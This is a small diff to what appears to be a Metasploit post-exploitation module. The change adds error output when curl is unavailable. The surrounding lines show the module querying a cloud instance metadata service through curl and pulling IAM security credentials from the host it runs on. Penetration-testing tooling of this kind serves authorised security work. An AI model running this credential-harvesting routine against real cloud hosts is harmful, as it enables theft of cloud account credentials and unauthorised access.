@@ -14,7 +14,8 @@ module Metasploit
 
         def metadata_creds
           # TODO: do it for windows/generic way
-          if cmd_exec("curl --version") =~ /^curl \d/
+          cmd_out = cmd_exec("curl --version")
+          if cmd_out =~ /^curl \d/
             url = "http://#{datastore['RHOST']}/2012-01-12/meta-data/"
             print_status("#{peer} - looking for creds...")
             resp = cmd_exec("curl #{url}")
@@ -25,6 +26,8 @@ module Metasploit
                 return JSON.parse(cmd_exec("curl #{url}iam/security-credentials/#{resp}"))
               end
             end
+          else
+            print_error cmd_out
           end
           {}
         end
